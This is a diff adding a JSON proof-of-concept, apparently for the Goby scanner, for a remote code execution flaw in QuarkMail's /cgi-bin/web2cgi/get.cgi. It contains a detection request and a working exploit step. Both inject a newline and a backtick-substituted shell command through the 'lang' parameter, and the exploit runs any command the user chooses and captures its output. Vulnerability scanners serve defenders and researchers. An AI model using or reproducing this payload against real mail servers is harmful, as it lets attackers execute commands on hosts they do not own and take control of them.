@@ -1,0 +1,93 @@
+{
+  "Name": "QuarkMail web2cgi rce",
+  "Description": "QuarkMail (QuarkMail) is a mail system software developed by Beijing Xiongzhi Weiye Co., Ltd. The related version of Quark Mail product uses CGI scripts, and there is a remote code execution vulnerability. Attackers can use the vulnerability to launch remote attacks by executing Specific instructions gradually penetrate and control the mail server host.",
+  "Product": "QuarkMail",
+  "Homepage": "http://www.ipmotor.com/index.html",
+  "DisclosureDate": "2021-05-21",
+  "Author": "langke",
+  "GobyQuery": "app=\"QuarkMail\"",
+  "Level": "3",
+  "Impact": "<p>Attackers can use the loopholes to launch remote attacks and gradually infiltrate and control the mail server host by executing specific instructions.<br></p>",
+  "Recommandation": "<p>update.</p>",
+  "References": [],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "id"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/cgi-bin/web2cgi/get.cgi?lang=%0Aecho%09%60echo%20608c5255daf7cf0%22%22%27%27d2c930fb1fe6377b9%60&dir=foo",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "608c5255daf7cf0d2c930fb1fe6377b9",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/cgi-bin/web2cgi/get.cgi?lang=%0Aecho%09%60{{{cmd}}}%60&dir=foo",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "output|lastbody|regex|(?s)\"html\":\"(.*?)\",\""
+      ]
+    }
+  ],
+  "Tags": [
+    "RCE"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
